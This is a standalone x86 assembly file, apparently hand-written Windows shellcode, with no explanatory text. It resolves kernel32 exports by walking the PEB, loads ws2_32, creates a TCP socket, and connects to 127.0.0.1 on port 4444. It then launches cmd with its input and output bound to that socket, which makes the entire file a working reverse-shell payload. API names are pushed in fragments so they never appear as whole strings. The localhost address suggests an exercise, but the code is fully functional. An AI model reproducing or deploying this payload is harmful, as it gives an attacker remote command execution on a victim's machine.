section .text
global _main
_main:

mov eax, fs:[0x30]
mov eax, [eax + 0xc]
mov eax, [eax+0x14]

mov ebx, [eax - 8 + 0x18]
push ebx

mov eax, [eax]
mov ebx, [eax - 8 + 0x18]
push ebx                    ; ntdll.dll

mov eax, [eax]
mov ebx, [eax - 8 + 0x18]
push ebx                    ; kernel32.dll

mov eax, [eax]
mov ebx, [eax - 8 + 0x18]
push ebx                    ; kernel32.dll

push eax                    ; if want to find more

mov eax, [esp+0x8]          ; kernel32.dll
mov ecx, eax
add ecx, 0x3c               ; offset to ne w exe header 
mov ebx, [ecx]              ; offset to image_nt_header
add ebx, 0x78               ; point to RVA
mov ecx, eax
add ecx, ebx                
mov ecx, [ecx]              ; rva of export table
push ecx
add ecx, eax                
push ecx                    ; export table

mov ecx, [esp]
add ecx, 0x14               ; number of exported functions
mov ecx, [ecx]                  
push ecx                    

mov ecx, [esp+4]
add ecx, 0x1c               ; Address Of Exported Functions
mov ecx, [ecx]
add ecx, eax
push ecx

mov ecx, [esp+8]
add ecx, 0x20               ; Address Of Name Exported Functions
mov ecx, [ecx]
add ecx, eax
push ecx

mov ecx, [esp+0xc]
add ecx, 0x24               ; Address Of Functions' Ordinal Table
mov ecx, [ecx]
add ecx, eax
push ecx

; esp: Functions' Ordinal Table
; esp+4: Name Exported Functions
; esp+8: Exported Functions
; esp+c: number of exported functions
; esp+10: export table
; esp+14: rva of export table

PUSH 0
PUSH 0x41797261					;"Ayra"
PUSH 0x7262694C					;"rbiL"
PUSH 0x64616F4C					;"daoL"
lea ecx, [esp]
xor edx, edx
push ecx
xor ecx, ecx
call find_func_LoadLibraryA                  ; LoadLibraryA
call exec_func_LoadLibraryA
add esp, 0x4
PUSH edx
xor edx, edx
xor ecx, ecx
PUSH 0
xor esi, esi
mov si, 0x7373
push esi
PUSH 0x65726464 ; "erdd"
PUSH 0x41636F72 ; "Acor"
PUSH 0x50746547	; "PteG"
PUSH ESP
call find_func_GetProcAddress
mov ebx, [esp-0x4c]
sub esp, 0x60
XOR  ecx, ecx					;zero out ebx register
MOV  cx, 0x0190					;EAX = sizeof(struct WSAData)
SUB  ESP, ecx					;allocate space for the WSAData structure
PUSH ESP 
PUSH ecx
call ebx
mov eax, [esp+0x208]
mov ebx, [esp+0x1e4]
PUSH 0x61614174					;"aaAt"
SUB  word [ESP + 0x2], 0x6161	     		;"At" (remove "aa")
PUSH  0x656b636f				;"ekco"
PUSH  0x53415357				;"SASW"
PUSH ESP					;"WSASocketA", GetProcAddress 2nd argument
push eax
call ebx
push eax
call WSASocketA
find_CreateProcessA:
    mov ebx, [esp+0x26c]                 ; kernel32.dll
    mov eax, [esp+0x214]
    PUSH 0x61614173                      ;"aaAs"
    SUB  dword [ESP + 0x2], 0x6161	     ;"As"
    PUSH 0x7365636f                      ;"seco"
    PUSH 0x72506574                      ;"rPet"
    PUSH 0x61657243                      ;"aerC"
    PUSH ESP                             ;"CreateProcessA" - 2nd argument of GetProcAddress
    push ebx
    call eax
    call trigger

ret

WSASocketA:
    XOR ECX, ECX					;zero out ECX register
    XOR EDX, EDX
    PUSH EDX					;null value for dwFlags argument
    PUSH EDX					;zero value since we dont have an existing socket group
    PUSH EDX					;null value for lpProtocolInfo
    MOV  DL, 0x6					;IPPROTO_TCP
    PUSH EDX					;set the protocol argument
    INC  ECX					;SOCK_STREAM(TCP)
    PUSH ECX					;set the type argument
    INC  ECX					;AF_INET(IPv4)
    PUSH ECX					;set the ddress family specification argument
    CALL EAX					;call WSASocketA
    XCHG EAX, ECX					;save the socket returned from WSASocketA at EAX to ECX in order to use it later

    mov eax, [esp+0x21c]                 ; ws2_32
    mov ebx, [esp+0x1f8]                 ; GetProcAddress
    PUSH 0x61746365                      ;"atce"
    SUB  word [ESP + 0x3], 0x61	     ;"tce" (remove "a")
    PUSH 0x6e6e6f63                      ;"nnoc"
    PUSH ESP                             ;"connect", second argument of GetProcAddress
    push eax
    XCHG ECX, EBP
    call ebx
    push eax
    call connect


find_func_GetProcAddress:
    mov esi, [esp+4]
    mov edi, [esp+0x14+0x20]         ; pointer to exported function names table
    cld
    mov edi, [edi+edx*4]
    add edi, eax
    mov cx, 14
    repe cmpsb
    jz return_GetProcAddress
    inc edx
    cmp edx, [esp+0x1c+0x20]
    jne find_func_GetProcAddress
return_GetProcAddress:
    call GetAddress_GetProcAddress
    ret
GetAddress_GetProcAddress:
    xor ebx, ebx
    xor ecx, ecx
    mov ebx, [esp+0x14+0x20]         ; Function Ordinal Table
    mov ecx, [esp+0x14+8+0x20]       ; export address table
    mov dx,  [ebx + edx*2]
    mov edx, [ecx + edx*4]
    add edx, eax
    push edx
    call exec_func_GetProcAddress
exec_func_GetProcAddress:
    mov ebx, [esp+0x28]
    push eax
    push 0
    PUSH 0x61617075					;"aapu"
    SUB  word [ESP + 0x2], 0x6161		 	;"pu" (remove "aa")
    PUSH 0x74726174					;"trat"
    PUSH 0x53415357					;"SASW"
    PUSH ESP
    push ebx
    call edx
    add esp, 8
    mov eax, [esp+0x8]
    add esp, 0x18
    ret

find_func_LoadLibraryA:
    mov esi, [esp+4]
    mov edi, [esp+0x1c]         ; pointer to exported function names table
    cld
    mov edi, [edi+edx*4]
    add edi, eax
    mov cx, 8
    repe cmpsb
    jz return_LoadLibraryA
    inc edx
    cmp edx, [esp+0x1c]
    jne find_func_LoadLibraryA
return_LoadLibraryA:
    call GetAddress_LoadLibraryA
    ret
GetAddress_LoadLibraryA:
    xor ebx, ebx
    xor ecx, ecx
    mov ebx, [esp+0x1c]         ; Function Ordinal Table
    mov ecx, [esp+0x1c+8]       ; export address table
    mov dx,  [ebx + edx*2]
    mov edx, [ecx + edx*4]
    add edx, eax
    ret
exec_func_LoadLibraryA:
    xor esi, esi
    MOV SI, 0x6C6C					;"ll"
    PUSH ESI
    PUSH 0x642E3233					;"d.23"
    PUSH 0x5F327377					;"_2sw"
    PUSH ESP					;"ws2_32.dll"
    mov esi, eax
    call edx
    mov edx, eax
    mov eax, esi
    add esp, 12
    ret
connect:
    PUSH 0x100007f                      ;sin_addr set to 127.0.0.1
    PUSH word 0x5c11		     ;port = 4444
    XOR  EBX, EBX                        ;zero out EBX
    add  BL, 0x2                         ;TCP protocol
    PUSH word BX			     ;push the protocol value on the stack
    MOV  EDX, ESP                        ;pointer to sockaddr structure (IP,Port,Protocol)
    PUSH byte  16			     ;the size of sockaddr - 3rd argument of connect
    PUSH EDX                             ;push the sockaddr - 2nd argument of connect
    PUSH EBP                             ;socket descriptor = 64 - 1st argument of connect
    XCHG EBP, EDI
    CALL EAX                             ;execute connect;
    call find_CreateProcessA
trigger:
    LEA EBP, [EAX]
    ;call CreateProcessA
    PUSH 0x61646d63                      ;"admc"
    SUB  word [ESP + 0x3], 0x61	     ;"dmc" ( remove a)
    MOV  ECX, ESP                        ;ecx now points to "cmd" string
    XOR  EDX, EDX                        ;zero out EDX
    SUB  ESP, 16
    MOV  EBX, esp                        ;pointer for ProcessInfo

    ;STARTUPINFOA struct
    PUSH EDI                             ;hStdError  => saved socket
    PUSH EDI                             ;hStdOutput => saved socket
    PUSH EDI                             ;hStdInput  => saved socket
    PUSH EDX                             ;lpReserved2 => NULL
    PUSH EDX                             ;cbReserved2 => NULL
    XOR  EAX, EAX                        ;zero out EAX register
    INC  EAX                             ;EAX => 0x00000001
    ROL  EAX, 8                          ;EAX => 0x00000100
    PUSH EAX                             ;dwFlags => STARTF_USESTDHANDLES 0x00000100
    PUSH EDX                             ;dwFillAttribute => NULL
    PUSH EDX                             ;dwYCountChars => NULL
    PUSH EDX                             ;dwXCountChars => NULL
    PUSH EDX                             ;dwYSize => NULL
    PUSH EDX                             ;dwXSize => NULL
    PUSH EDX                             ;dwY => NULL
    PUSH EDX                             ;dwX => NULL
    PUSH EDX                             ;pTitle => NULL
    PUSH EDX                             ;pDesktop => NULL
    PUSH EDX                             ;pReserved => NULL
    XOR  EAX, EAX                        ;zero out EAX
    ADD  AL, 44                          ;cb => 0x44 (size of struct)
    PUSH EAX                             ;eax points to STARTUPINFOA

    ;ProcessInfo struct
    MOV  EAX, ESP                        ;pStartupInfo
    PUSH EBX                             ;pProcessInfo
    PUSH EAX                             ;pStartupInfo
    PUSH EDX                             ;CurrentDirectory => NULL
    PUSH EDX                             ;pEnvironment => NULL
    PUSH EDX                             ;CreationFlags => 0
    XOR  EAX, EAX                        ;zero out EAX register
    INC  EAX                             ;EAX => 0x00000001
    PUSH EAX                             ;InheritHandles => TRUE => 1
    PUSH EDX                             ;pThreadAttributes => NULL
    PUSH EDX                             ;pProcessAttributes => NULL
    PUSH ECX                             ;pCommandLine => pointer to "cmd"
    PUSH EDX                             ;ApplicationName => NULL
    CALL EBP                             ;execute CreateProcessA
    mov eax, [esp+0x2e4]
    push eax
    ret